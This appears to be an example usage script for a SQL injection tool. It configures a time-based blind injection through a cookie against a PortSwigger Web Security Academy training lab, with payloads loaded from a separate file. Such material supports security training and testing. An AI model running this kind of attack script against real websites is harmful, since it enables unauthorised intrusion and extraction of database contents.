from injection_warrior import sqli_blind
from injection_warrior import warrior

import os
import sys
import json

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "injection_warrior/payloads.json"
abs_file_path = os.path.join(script_dir, rel_path)
f_payloads = open(abs_file_path.replace('/examples', ''), 'r')
sqli_payloads = json.load(f_payloads)

blind_sqli_obj = sqli_blind.SQLiBlind(proxy="http://192.168.56.1:8889", debug=False)
url = "https://ac1e1f1b1ee128ea8029225e00a9001d.web-security-academy.net"
blind_time_db_payloads = sqli_payloads.get('sqli').get('database_content').get('version_detection').get('blind_time').get('postgreSQL')

data = blind_sqli_obj.inject_payload(
        url=url,  
        http_method="get", 
        blind_type="time_based",
        injection_point="cookie",
        header_params={"User-Agent": "Mozilla"},
        cookie_params={"TrackingId":"%$%"},
        delimiter='+',
        payloads= [blind_time_db_payloads],
        iterations = 1,
        comment="--",
        comma="%2c",
        req_json=False,
        resp_body=False,
        sleep=10,
        html=True)
print(data)